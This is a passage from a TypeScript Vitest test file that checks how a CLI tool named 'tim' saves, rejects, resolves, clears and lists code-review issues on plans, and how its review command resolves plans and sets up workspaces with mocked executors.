    async (issueValue, expectedMessageFragment) => {
      process.chdir(testDir);
      const outputPath = join(testDir, `issue-index-${issueValue}.json`);
      await writeFile(
        outputPath,
        JSON.stringify({
          issues: [
            { severity: 'major', category: 'bug', content: 'a' },
            { severity: 'minor', category: 'style', content: 'b' },
          ],
        })
      );
      await expect(
        handleReviewIssuesRejectCommand(
          40,
          { reason: 'Not applicable', fromReview: outputPath, issue: issueValue },
          { parent: { opts: () => ({}) } }
        )
      ).rejects.toThrow(expectedMessageFragment);
    }
  );

  test('review issue rejection fields survive schema and DB JSON round-trip', async () => {
    const rejectedIssue = {
      id: 'issue-rejected',
      severity: 'major' as const,
      category: 'bug',
      content: 'An intentionally rejected issue',
      file: 'src/example.ts',
      line: 12,
      suggestion: 'Keep the existing behavior',
      rejected: true,
      rejectedReason: 'This behavior is required by the API contract.',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };
    const parsedPlan = planSchema.parse({
      id: 2,
      title: 'Round-trip rejected issue',
      goal: 'Verify rejection metadata persists',
      details: 'Details',
      tasks: [],
      reviewIssues: [rejectedIssue],
    });

    await writePlanToDb(parsedPlan, { cwdForIdentity: testDir });

    const updatedPlan = (await resolvePlanByNumericId(2, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([rejectedIssue]);
  });

  test('a save disposition preserves rejected issues and refreshes others', async () => {
    const rejectedIssue = {
      id: 'issue-rejected',
      severity: 'major' as const,
      category: 'bug',
      content: 'An intentionally rejected issue',
      file: 'src/example.ts',
      line: 12,
      suggestion: 'Keep the existing behavior',
      rejected: true,
      rejectedReason: 'This behavior is required by the API contract.',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };
    const replacementIssue = {
      id: 'issue-new',
      severity: 'minor' as const,
      category: 'testing',
      content: 'Add a regression test',
      file: 'src/example.test.ts',
      line: '24-30',
    };

    await writePlanToDb(
      {
        id: 3,
        title: 'Merge review issues',
        goal: 'Keep rejected findings while refreshing active findings',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          rejectedIssue,
          {
            id: 'issue-stale',
            severity: 'minor',
            category: 'style',
            content: 'A stale issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await persistReviewIssueSave(
      3,
      [
        {
          suggestion: 'Keep the existing behavior',
          line: 12,
          file: 'src/example.ts',
          content: 'An intentionally rejected issue',
          category: 'bug',
          severity: 'major',
          id: 'issue-rejected',
        },
        replacementIssue,
      ],
      testDir
    );

    const updatedPlan = (await resolvePlanByNumericId(3, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([rejectedIssue, replacementIssue]);
  });

  test('clearSavedReviewIssues keeps rejected issues by default and clears them with all', async () => {
    const configPath = join(testDir, '.tim.yml');
    await writeFile(configPath, 'review: {}\n');
    await writePlanToDb(
      {
        id: 4,
        title: 'Clear review issues',
        goal: 'Verify saved issues can be removed',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'issue-rejected',
            severity: 'major',
            category: 'bug',
            content: 'Keep this rejected issue',
            rejected: true,
            rejectedReason: 'Intentional behavior',
            rejectedAt: '2026-08-03T12:00:00.000Z',
          },
          {
            id: 'issue-1',
            severity: 'critical',
            category: 'security',
            content: 'A critical issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await expect(clearSavedReviewIssues(4, testDir)).resolves.toBe(1);
    const afterDefaultClear = (await resolvePlanByNumericId(4, testDir)).plan;
    expect(afterDefaultClear.reviewIssues).toEqual([
      {
        id: 'issue-rejected',
        severity: 'major',
        category: 'bug',
        content: 'Keep this rejected issue',
        rejected: true,
        rejectedReason: 'Intentional behavior',
        rejectedAt: '2026-08-03T12:00:00.000Z',
      },
    ]);

    await expect(clearSavedReviewIssues(4, testDir)).resolves.toBe(0);
    expect((await resolvePlanByNumericId(4, testDir)).plan.reviewIssues).toEqual(
      afterDefaultClear.reviewIssues
    );

    await expect(clearSavedReviewIssues(4, testDir, { all: true })).resolves.toBe(1);

    const updatedPlan = (await resolvePlanByNumericId(4, testDir)).plan;
    expect(updatedPlan.reviewIssues).toBeUndefined();
  });

  test('resolveSavedReviewIssues removes selected saved issues by one-based index', async () => {
    await writePlanToDb(
      {
        id: 3,
        title: 'Resolve selected review issues',
        goal: 'Keep unselected saved issues',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'issue-1',
            severity: 'major',
            category: 'bug',
            content: 'Fix the first issue',
          },
          {
            id: 'issue-2',
            severity: 'minor',
            category: 'testing',
            content: 'Keep this issue',
          },
          {
            id: 'issue-3',
            severity: 'critical',
            category: 'security',
            content: 'Fix the third issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await expect(resolveSavedReviewIssues(3, [1, 3], testDir)).resolves.toBe(2);

    const updatedPlan = (await resolvePlanByNumericId(3, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([
      {
        id: 'issue-2',
        severity: 'minor',
        category: 'testing',
        content: 'Keep this issue',
      },
    ]);
  });

  test('resolveSavedReviewIssues deletes the reviewIssues key when the last remaining issue is resolved', async () => {
    await writePlanToDb(
      {
        id: 45,
        title: 'Resolve the only saved issue',
        goal: 'Resolving every saved issue must drop the reviewIssues key entirely',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'issue-only',
            severity: 'major',
            category: 'bug',
            content: 'The only saved issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await expect(resolveSavedReviewIssues(45, [1], testDir)).resolves.toBe(1);

    const updatedPlan = (await resolvePlanByNumericId(45, testDir)).plan;
    expect(updatedPlan.reviewIssues).toBeUndefined();
  });

  test('listSavedReviewIssues returns saved review issues', async () => {
    await writePlanToDb(
      {
        id: 5,
        title: 'List review issues',
        goal: 'Show persisted review issues',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'issue-1',
            severity: 'major',
            category: 'bug',
            content: 'Persisted issue',
          },
          {
            id: 'issue-rejected',
            severity: 'minor',
            category: 'style',
            content: 'Rejected issue remains visible',
            rejected: true,
            rejectedReason: 'Intentional behavior',
            rejectedAt: '2026-08-03T12:00:00.000Z',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await expect(listSavedReviewIssues(5, testDir)).resolves.toEqual([
      {
        id: 'issue-1',
        severity: 'major',
        category: 'bug',
        content: 'Persisted issue',
      },
      {
        id: 'issue-rejected',
        severity: 'minor',
        category: 'style',
        content: 'Rejected issue remains visible',
        rejected: true,
        rejectedReason: 'Intentional behavior',
        rejectedAt: '2026-08-03T12:00:00.000Z',
      },
    ]);
  });

  test('handleReviewIssuesListCommand shows rejection reason and timestamp', async () => {
    await writePlanToDb(
      {
        id: 41,
        title: 'List rejection details',
        goal: 'Show the rejection disposition in the ledger view',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            severity: 'major',
            category: 'bug',
            content: 'This finding is intentionally retained as rejected.',
            rejected: true,
            rejectedReason: 'The behavior is required by the public API.',
            rejectedAt: '2026-08-03T12:00:00.000Z',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    process.chdir(testDir);

    const logSpy = vi.mocked(loggingModule.log);
    logSpy.mockClear();
    await handleReviewIssuesListCommand(41, {}, { parent: { opts: () => ({}) } });

    const output = logSpy.mock.calls.map(([message]) => String(message)).join('\n');
    expect(output).toContain('Rejected');
    expect(output).toContain('The behavior is required by the public API.');
    expect(output).toContain('2026-08-03T12:00:00.000Z');
  });

  test('handleReviewIssuesClearCommand clears open issues and supports --all', async () => {
    await writePlanToDb(
      {
        id: 42,
        title: 'Clear review issues from the command',
        goal: 'Expose the default and full clear paths',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            severity: 'major',
            category: 'bug',
            content: 'Keep this rejected issue.',
            rejected: true,
            rejectedReason: 'Intentional behavior.',
            rejectedAt: '2026-08-03T12:00:00.000Z',
          },
          {
            severity: 'major',
            category: 'bug',
            content: 'Clear this open issue.',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );
    process.chdir(testDir);

    const logSpy = vi.mocked(loggingModule.log);
    logSpy.mockClear();
    await handleReviewIssuesClearCommand(42, {}, { parent: { opts: () => ({}) } });
    expect((await resolvePlanByNumericId(42, testDir)).plan.reviewIssues).toHaveLength(1);
    expect(logSpy.mock.calls.at(-1)?.[0]).toContain(
      'Cleared 1 open saved review issue for plan 42. Rejected entries were kept.'
    );

    logSpy.mockClear();
    await handleReviewIssuesClearCommand(42, { all: true }, { parent: { opts: () => ({}) } });
    expect((await resolvePlanByNumericId(42, testDir)).plan.reviewIssues).toBeUndefined();
    expect(logSpy.mock.calls.at(-1)?.[0]).toContain(
      'Cleared 1 saved review issue for plan 42, including rejected entries.'
    );

    logSpy.mockClear();
    await handleReviewIssuesClearCommand(42, {}, { parent: { opts: () => ({}) } });
    expect(logSpy.mock.calls.at(-1)?.[0]).toContain(
      'No open saved review issues to clear for plan 42. Use --all to clear rejected entries too.'
    );

    logSpy.mockClear();
    await handleReviewIssuesClearCommand(42, { all: true }, { parent: { opts: () => ({}) } });
    expect(logSpy.mock.calls.at(-1)?.[0]).toContain('No saved review issues to clear for plan 42.');
  });

  test('review issue rejection fields survive a plan-file write/read round trip', async () => {
    const planPath = join(testDir, 'rejection-round-trip.plan.md');
    const rejectedIssue = {
      id: 'issue-rejected',
      severity: 'major' as const,
      category: 'bug',
      content: 'An intentionally rejected issue',
      rejected: true,
      rejectedReason: 'Matches an existing accepted pattern.',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };

    await writePlanFile(
      planPath,
      {
        id: 20,
        title: 'Plan-file round trip',
        goal: 'Verify rejection metadata survives a file round trip',
        details: 'Details',
        tasks: [],
        reviewIssues: [rejectedIssue],
      },
      { cwdForIdentity: testDir }
    );

    const reloaded = await readPlanFile(planPath);
    expect(reloaded.reviewIssues).toEqual([rejectedIssue]);
  });

  test('a save disposition preserves identity across property order and review-run IDs', async () => {
    const rejectedIssue = {
      id: 'issue-rejected',
      severity: 'major' as const,
      category: 'bug',
      content: 'Same finding reappears',
      file: 'src/example.ts',
      line: 12,
      rejected: true,
      rejectedReason: 'Already reviewed and accepted.',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };

    await writePlanToDb(
      {
        id: 21,
        title: 'Identity stability across key order',
        goal: 'A rejected finding must not be duplicated when it reappears with reordered keys',
        details: 'Details',
        tasks: [],
        reviewIssues: [rejectedIssue],
      },
      { cwdForIdentity: testDir }
    );

    // Same finding as `rejectedIssue`, but re-emitted fresh (non-rejected) by a later reviewer
    // run with a different property order and a new positional ID.
    const reappearedIssue = {
      line: 12,
      content: 'Same finding reappears',
      file: 'src/example.ts',
      category: 'bug',
      id: 'issue-from-a-later-review-run',
      severity: 'major' as const,
    };

    await persistReviewIssueSave(21, [reappearedIssue], testDir);

    const updatedPlan = (await resolvePlanByNumericId(21, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([rejectedIssue]);
  });

  describe('clearSavedReviewIssues edge cases', () => {
    test('does not throw when the plan has no rejected or actionable saved issues', async () => {
      await writePlanToDb(
        {
          id: 22,
          title: 'No review issues yet',
          goal: 'Clearing must not throw when there is nothing to clear',
          details: 'Details',
          tasks: [],
        },
        { cwdForIdentity: testDir }
      );

      // A freshly created plan normalizes reviewIssues to an empty array rather than
      // leaving the key absent; clearing it must be a safe no-op either way.
      const beforeClear = (await resolvePlanByNumericId(22, testDir)).plan;
      expect(beforeClear.reviewIssues ?? []).toEqual([]);

      await expect(clearSavedReviewIssues(22, testDir)).resolves.toBe(0);

      const updatedPlan = (await resolvePlanByNumericId(22, testDir)).plan;
      expect(updatedPlan.reviewIssues ?? []).toEqual([]);
      // An empty reviewIssues array must be a true no-op: no routed plan write, so
      // updatedAt must not move even though the array is technically "present".
      expect(updatedPlan.updatedAt).toEqual(beforeClear.updatedAt);
    });

    test('{ all: true } is also a no-op when reviewIssues is empty', async () => {
      await writePlanToDb(
        {
          id: 27,
          title: 'No review issues yet, all flag',
          goal: 'The all escape hatch must not write when there is nothing to clear',
          details: 'Details',
          tasks: [],
        },
        { cwdForIdentity: testDir }
      );

      const beforeClear = (await resolvePlanByNumericId(27, testDir)).plan;
      expect(beforeClear.reviewIssues ?? []).toEqual([]);

      await expect(clearSavedReviewIssues(27, testDir, { all: true })).resolves.toBe(0);

      const updatedPlan = (await resolvePlanByNumericId(27, testDir)).plan;
      expect(updatedPlan.reviewIssues ?? []).toEqual([]);
      expect(updatedPlan.updatedAt).toEqual(beforeClear.updatedAt);
    });

    test('default clear is a no-op when every saved issue is rejected', async () => {
      const rejectedIssues = [
        {
          id: 'issue-rejected-1',
          severity: 'major' as const,
          category: 'bug',
          content: 'First rejected issue',
          rejected: true,
          rejectedReason: 'Intentional behavior',
          rejectedAt: '2026-08-03T12:00:00.000Z',
        },
        {
          id: 'issue-rejected-2',
          severity: 'minor' as const,
          category: 'style',
          content: 'Second rejected issue',
          rejected: true,
          rejectedReason: 'Cosmetic, accepted as-is',
          rejectedAt: '2026-08-03T12:05:00.000Z',
        },
      ];

      await writePlanToDb(
        {
          id: 23,
          title: 'Only rejected issues',
          goal: 'Default clear must leave an all-rejected list untouched',
          details: 'Details',
          tasks: [],
          reviewIssues: rejectedIssues,
        },
        { cwdForIdentity: testDir }
      );

      await expect(clearSavedReviewIssues(23, testDir)).resolves.toBe(0);

      const updatedPlan = (await resolvePlanByNumericId(23, testDir)).plan;
      expect(updatedPlan.reviewIssues).toEqual(rejectedIssues);
    });

    test('default clear removes the key entirely when no saved issue is rejected', async () => {
      await writePlanToDb(
        {
          id: 24,
          title: 'Only active issues',
          goal: 'Default clear must drop the reviewIssues key when nothing is rejected',
          details: 'Details',
          tasks: [],
          reviewIssues: [
            {
              id: 'issue-1',
              severity: 'major',
              category: 'bug',
              content: 'An active issue',
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      await expect(clearSavedReviewIssues(24, testDir)).resolves.toBe(1);

      const updatedPlan = (await resolvePlanByNumericId(24, testDir)).plan;
      expect(updatedPlan.reviewIssues).toBeUndefined();
    });

    test('{ all: true } removes rejected issues too', async () => {
      await writePlanToDb(
        {
          id: 25,
          title: 'Force clear rejected issues',
          goal: 'The all escape hatch must remove rejected entries as well',
          details: 'Details',
          tasks: [],
          reviewIssues: [
            {
              id: 'issue-rejected',
              severity: 'major',
              category: 'bug',
              content: 'A rejected issue',
              rejected: true,
              rejectedReason: 'Intentional behavior',
              rejectedAt: '2026-08-03T12:00:00.000Z',
            },
          ],
        },
        { cwdForIdentity: testDir }
      );

      await clearSavedReviewIssues(25, testDir, { all: true });

      const updatedPlan = (await resolvePlanByNumericId(25, testDir)).plan;
      expect(updatedPlan.reviewIssues).toBeUndefined();
    });
  });

  test('a save disposition behaves like before when the plan has no prior reviewIssues', async () => {
    await writePlanToDb(
      {
        id: 26,
        title: 'First save with no prior issues',
        goal: 'Saving without an existing reviewIssues key must work like a plain overwrite',
        details: 'Details',
        tasks: [],
      },
      { cwdForIdentity: testDir }
    );

    const issues = [
      {
        id: 'issue-1',
        severity: 'critical' as const,
        category: 'security' as const,
        content: 'A fresh finding',
        file: 'src/first.ts',
        line: 5,
      },
    ];

    await persistReviewIssueSave(26, issues, testDir);

    const updatedPlan = (await resolvePlanByNumericId(26, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual(issues);
  });

  test('a save disposition excludes note severity while preserving multiple rejected entries in order', async () => {
    const rejectedIssues = [
      {
        id: 'issue-rejected-a',
        severity: 'major' as const,
        category: 'bug',
        content: 'First rejected issue',
        rejected: true,
        rejectedReason: 'Reason A',
        rejectedAt: '2026-08-03T12:00:00.000Z',
      },
      {
        id: 'issue-rejected-b',
        severity: 'minor' as const,
        category: 'style',
        content: 'Second rejected issue',
        rejected: true,
        rejectedReason: 'Reason B',
        rejectedAt: '2026-08-03T12:05:00.000Z',
      },
    ];

    await writePlanToDb(
      {
        id: 27,
        title: 'Multiple rejected entries',
        goal: 'Confirm stable ordering and note filtering during merge',
        details: 'Details',
        tasks: [],
        reviewIssues: rejectedIssues,
      },
      { cwdForIdentity: testDir }
    );

    const incomingIssues = [
      {
        id: 'issue-active',
        severity: 'major',
        category: 'bug',
        content: 'An actionable issue',
      },
      {
        id: 'issue-note',
        severity: 'note',
        category: 'other',
        content: 'A descriptive annotation, not actionable',
      },
    ] as any;

    await persistReviewIssueSave(27, incomingIssues, testDir);

    const updatedPlan = (await resolvePlanByNumericId(27, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([...rejectedIssues, incomingIssues[0]]);
  });

  test('resolveSavedReviewIssues indexes the same list listSavedReviewIssues prints, rejected entries included', async () => {
    const issues = [
      {
        id: 'issue-rejected',
        severity: 'major',
        category: 'bug',
        content: 'A rejected issue that still appears in the ledger view',
        rejected: true,
        rejectedReason: 'Accepted behavior',
        rejectedAt: '2026-08-03T12:00:00.000Z',
      },
      {
        id: 'issue-1',
        severity: 'major',
        category: 'bug',
        content: 'First actionable issue',
      },
      {
        id: 'issue-2',
        severity: 'minor',
        category: 'testing',
        content: 'Second actionable issue',
      },
    ];

    await writePlanToDb(
      {
        id: 28,
        title: 'Resolve among mixed dispositions',
        goal: 'resolveSavedReviewIssues indexing must be unchanged and stay in sync with listSavedReviewIssues',
        details: 'Details',
        tasks: [],
        reviewIssues: issues,
      },
      { cwdForIdentity: testDir }
    );

    // listSavedReviewIssues is a ledger view: rejected entries remain visible, so the
    // 1-based index resolveSavedReviewIssues accepts must line up with this same list.
    await expect(listSavedReviewIssues(28, testDir)).resolves.toEqual(issues);

    // Index 2 is 'issue-1' in that ledger view.
    await expect(resolveSavedReviewIssues(28, [2], testDir)).resolves.toBe(1);

    const updatedPlan = (await resolvePlanByNumericId(28, testDir)).plan;
    expect(updatedPlan.reviewIssues).toEqual([issues[0], issues[2]]);
  });

  test('resolveSavedReviewIssues --all leaves rejected entries in the ledger', async () => {
    const rejectedIssue = {
      severity: 'major' as const,
      category: 'bug',
      content: 'A rejected issue that --all must keep.',
      rejected: true,
      rejectedReason: 'This behavior is intentional.',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };
    const openIssue = {
      severity: 'major' as const,
      category: 'bug',
      content: 'An open issue that --all should resolve.',
    };

    await writePlanToDb(
      {
        id: 30,
        title: 'Resolve all open review issues',
        goal: 'The all target must not remove rejected findings',
        details: 'Details',
        tasks: [],
        reviewIssues: [rejectedIssue, openIssue],
      },
      { cwdForIdentity: testDir }
    );

    await expect(resolveSavedReviewIssues(30, 'all', testDir)).resolves.toBe(1);
    expect((await resolvePlanByNumericId(30, testDir)).plan.reviewIssues).toEqual([rejectedIssue]);
  });

  test('a resolve disposition removes the matching open issue but never a rejection', async () => {
    const rejectedIssue = {
      id: 'rejected',
      severity: 'major' as const,
      category: 'bug',
      content: 'The same finding is already rejected.',
      file: 'src/review.ts',
      line: 12,
      rejected: true,
      rejectedReason: 'The existing behavior is required.',
      rejectedAt: '2026-08-03T12:00:00.000Z',
    };
    const openIssue = {
      id: 'open',
      severity: 'minor' as const,
      category: 'bug',
      content: 'A separate open finding.',
      file: 'src/open.ts',
      line: 8,
      suggestion: 'Add a test.',
    };

    await writePlanToDb(
      {
        id: 31,
        title: 'Resolve review issues by identity',
        goal: 'Autofix resolution must not use saved-list positions',
        details: 'Details',
        tasks: [],
        reviewIssues: [rejectedIssue, openIssue],
      },
      { cwdForIdentity: testDir }
    );

    await expect(
      persistReviewIssueResolve(
        31,
        [
          {
            id: 'new-review-run-id',
            severity: 'major',
            category: 'bug',
            content: 'A separate open finding.',
            file: 'src/open.ts',
            line: '8',
          },
        ],
        testDir
      )
    ).resolves.toBe(1);

    expect((await resolvePlanByNumericId(31, testDir)).plan.reviewIssues).toEqual([rejectedIssue]);
  });

  test('a resolve disposition deletes the reviewIssues key when the last remaining issue is resolved', async () => {
    const openIssue = {
      id: 'open-only',
      severity: 'minor' as const,
      category: 'bug',
      content: 'The only saved issue, with no rejected entries alongside it.',
      file: 'src/only.ts',
      line: 4,
    };

    await writePlanToDb(
      {
        id: 46,
        title: 'Resolve the only saved issue by identity',
        goal: 'Resolving the last open issue must drop the reviewIssues key entirely',
        details: 'Details',
        tasks: [],
        reviewIssues: [openIssue],
      },
      { cwdForIdentity: testDir }
    );

    await expect(
      persistReviewIssueResolve(
        46,
        [
          {
            id: 'new-review-run-id',
            severity: 'minor',
            category: 'bug',
            content: 'The only saved issue, with no rejected entries alongside it.',
            file: 'src/only.ts',
            line: '4',
          },
        ],
        testDir
      )
    ).resolves.toBe(1);

    expect((await resolvePlanByNumericId(46, testDir)).plan.reviewIssues).toBeUndefined();
  });

  test('resolveSavedReviewIssues throws a clear error for an out-of-range index', async () => {
    await writePlanToDb(
      {
        id: 29,
        title: 'Out of range resolve',
        goal: 'An invalid index must throw instead of silently no-op',
        details: 'Details',
        tasks: [],
        reviewIssues: [
          {
            id: 'issue-1',
            severity: 'major',
            category: 'bug',
            content: 'Only issue',
          },
        ],
      },
      { cwdForIdentity: testDir }
    );

    await expect(resolveSavedReviewIssues(29, [5], testDir)).rejects.toThrow(
      'Review issue index 5 is out of range. Expected 1-1.'
    );
  });
});

test('a save disposition persists only the selected review issues', async () => {
  const configPath = join(testDir, '.tim.yml');
  await writeFile(configPath, 'review: {}\n');
  await writePlanToDb(
    {
      id: 10,
      title: 'Save selected review issues',
      goal: 'Only persist the issues the user selected',
      details: 'Details',
      tasks: [],
    },
    { cwdForIdentity: testDir }
  );

  const reviewIssues = [
    {
      id: 'issue-1',
      severity: 'critical' as const,
      category: 'security' as const,
      content: 'Critical security issue',
      file: 'src/security.ts',
      line: 12,
    },
    {
      id: 'issue-2',
      severity: 'minor' as const,
      category: 'testing' as const,
      content: 'Missing regression test',
      file: 'src/security.test.ts',
      line: 44,
    },
  ];

  await persistReviewIssueSave(10, [reviewIssues[0]], testDir);

  const updatedPlan = (await resolvePlanByNumericId(10, testDir)).plan;
  expect(updatedPlan.reviewIssues).toEqual([reviewIssues[0]]);
});

test('a merge save disposition preserves the open issue queue and deduplicates updates', async () => {
  const firstIssue = {
    id: 'issue-1',
    severity: 'major' as const,
    category: 'bug' as const,
    content: 'The first issue remains open',
    file: 'src/first.ts',
    line: 10,
  };
  const secondIssue = {
    id: 'issue-2',
    severity: 'minor' as const,
    category: 'testing' as const,
    content: 'The second issue is refreshed',
    file: 'src/second.ts',
    line: 20,
  };
  const thirdIssue = {
    id: 'issue-3',
    severity: 'info' as const,
    category: 'style' as const,
    content: 'The third issue remains open',
    file: 'src/third.ts',
    line: 30,
  };
  const refreshedSecondIssue = {
    ...secondIssue,
    id: 'new-review-id',
    suggestion: 'Use the updated test fixture',
  };

  await writePlanToDb(
    {
      id: 12,
      title: 'Merge partial review issues',
      goal: 'Preserve earlier issues when saving a partial append-gate subset',
      details: 'Details',
      tasks: [],
      reviewIssues: [firstIssue, secondIssue, thirdIssue],
    },
    { cwdForIdentity: testDir }
  );

  await persistReviewIssueSave(12, [refreshedSecondIssue], testDir, { merge: true });

  const updatedPlan = (await resolvePlanByNumericId(12, testDir)).plan;
  expect(updatedPlan.reviewIssues).toEqual([firstIssue, refreshedSecondIssue, thirdIssue]);
});

test('a save disposition excludes note severity annotations', async () => {
  await writeFile(join(testDir, '.tim.yml'), 'review: {}\n');
  await writePlanToDb(
    {
      id: 11,
      title: 'Save actionable review issues',
      goal: 'Notes should not be saved for fix workflows',
      details: 'Details',
      tasks: [],
    },
    { cwdForIdentity: testDir }
  );

  const reviewIssues = [
    {
      id: 'issue-1',
      severity: 'major',
      category: 'bug',
      content: 'Actionable issue',
      file: 'src/actionable.ts',
    },
    {
      id: 'issue-note',
      severity: 'note',
      category: 'other',
      content: 'Descriptive annotation',
      file: 'src/note.ts',
    },
  ] as any;

  await persistReviewIssueSave(11, reviewIssues, testDir);

  const updatedPlan = (await resolvePlanByNumericId(11, testDir)).plan;
  expect(updatedPlan.reviewIssues).toEqual([reviewIssues[0]]);
});

test('handleReviewCommand resolves plan by numeric ID', async () => {
  // Create a test plan in the DB
  await writePlanToDb(
    {
      id: 1,
      title: 'Test Plan',
      goal: 'Test the review functionality',
      details: 'This is a test plan for the review command',
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    },
    { cwdForIdentity: testDir }
  );
  const planFile = join(testDir, 'test-plan.yml');

  // Mock the buildExecutorAndLog and other dependencies
  vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  } as any);

  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
  } as any);

  vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
    createMockPlanContext({
      resolvedPlanFile: planFile,
      planData: {
        id: 1,
        title: 'Test Plan',
        goal: 'Test the review functionality',
        details: 'This is a test plan for the review command',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
            steps: [
              {
                prompt: 'Do something',
                done: false,
              },
            ],
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'mock diff',
      },
      incrementalSummary: null,
      noChangesDetected: false,
    }) as any
  );

  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);
  vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
    prompt: 'mock reviewer prompt',
  } as any);

  // Test resolving plan by numeric ID
  const mockCommand = {
    parent: {
      opts: () => ({}),
    },
  };

  await handleReviewCommand(1, {}, mockCommand);
});

test('handleReviewCommand supports auto workspace selection', async () => {
  await writePlanToDb(
    {
      id: 2,
      title: 'Workspace Review Plan',
      goal: 'Test auto workspace review',
      details: 'Details',
      tasks: [{ title: 'Review task', description: 'A task' }],
    },
    { cwdForIdentity: testDir }
  );

  const workspaceDir = join(testDir, 'selected-workspace');
  const workspacePlanFile = join(workspaceDir, '.tim', 'plans', '2.plan.md');
  await mkdir(join(workspaceDir, '.tim', 'plans'), { recursive: true });
  const setupWorkspaceSpy = vi.spyOn(workspaceSetupModule, 'setupWorkspace').mockResolvedValue({
    baseDir: workspaceDir,
    planFile: workspacePlanFile,
  } as any);

  vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  } as any);
  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
  } as any);
  vi.mocked(contextGatheringModule.gatherPlanContext).mockResolvedValue(
    createMockPlanContext({
      repoRoot: workspaceDir,
      gitRoot: workspaceDir,
      resolvedPlanFile: workspacePlanFile,
      planData: {
        id: 2,
        title: 'Workspace Review Plan',
        goal: 'Test auto workspace review',
        details: 'Details',
        tasks: [{ title: 'Review task', description: 'A task' }],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'mock diff',
      },
      incrementalSummary: null,
      noChangesDetected: false,
    }) as any
  );
  vi.mocked(gitModule.getGitRoot).mockResolvedValue(testDir);
  vi.mocked(gitModule.getTrunkBranch).mockResolvedValue('main');
  vi.mocked(gitModule.getUsingJj).mockResolvedValue(false);
  vi.mocked(agentPromptsModule.getReviewerPrompt).mockReturnValue({
    prompt: 'mock reviewer prompt',
  } as any);

  try {
    await handleReviewCommand(
      2,
      { autoWorkspace: true, noSave: true },
      { parent: { opts: () => ({}) } }
    );

    expect(setupWorkspaceSpy).toHaveBeenCalledWith(
      expect.objectContaining({
        autoWorkspace: true,
        planId: 2,
        allowPrimaryWorkspaceWhenLocked: true,
      }),
      testDir,
      undefined,
      expect.objectContaining({ defaultExecutor: 'codex-cli' }),
      'tim review'
    );
    expect(contextGatheringModule.gatherPlanContext).toHaveBeenCalledWith(
      2,
      expect.objectContaining({ autoWorkspace: true, cwd: workspaceDir }),
      expect.any(Object)
    );
    expect(executorsModule.buildExecutorAndLog).toHaveBeenCalledWith(
      'codex-cli',
      expect.objectContaining({
        baseDir: workspaceDir,
        timEnvironment: expect.objectContaining({
          context: expect.objectContaining({
            repoPath: testDir,
            workspacePath: workspaceDir,
            planId: '2',
          }),
        }),
      }),
      expect.objectContaining({ defaultExecutor: 'codex-cli' })
    );
  } finally {
    setupWorkspaceSpy.mockRestore();
  }
});

test('handleReviewCommand resolves plan by ID', async () => {
  await writePlanToDb(
    {
      id: 42,
      title: 'Test Plan with ID',
      goal: 'Test plan resolution by ID',
      details: 'This plan should be resolvable by its ID',
      tasks: [
        {
          title: 'Test task',
          description: 'A test task',
        },
      ],
    },
    { cwdForIdentity: testDir }
  );

  const gatherPlanContextMock = vi.fn(async (planArg: number) => {
    expect(planArg).toBe(42);
    return createMockPlanContext({
      resolvedPlanFile: '42',
      planData: {
        id: 42,
        title: 'Test Plan with ID',
        goal: 'Test plan resolution by ID',
        details: 'This plan should be resolvable by its ID',
        tasks: [
          {
            title: 'Test task',
            description: 'A test task',
          },
        ],
      },
      parentChain: [],
      completedChildren: [],
      diffResult: {
        hasChanges: true,
        changedFiles: ['test.ts'],
        baseBranch: 'main',
        diffContent: 'mock diff',
      },
    });
  });

  // Mock dependencies
  vi.mocked(executorsModule.buildExecutorAndLog).mockReturnValue({
    execute: vi.fn(async () =>
      JSON.stringify({
        issues: [],
        recommendations: [],
        actionItems: [],
      })
    ),
  } as any);

  vi.mocked(configLoaderModule.loadEffectiveConfig).mockResolvedValue({
    defaultExecutor: 'codex-cli',
  } as any);

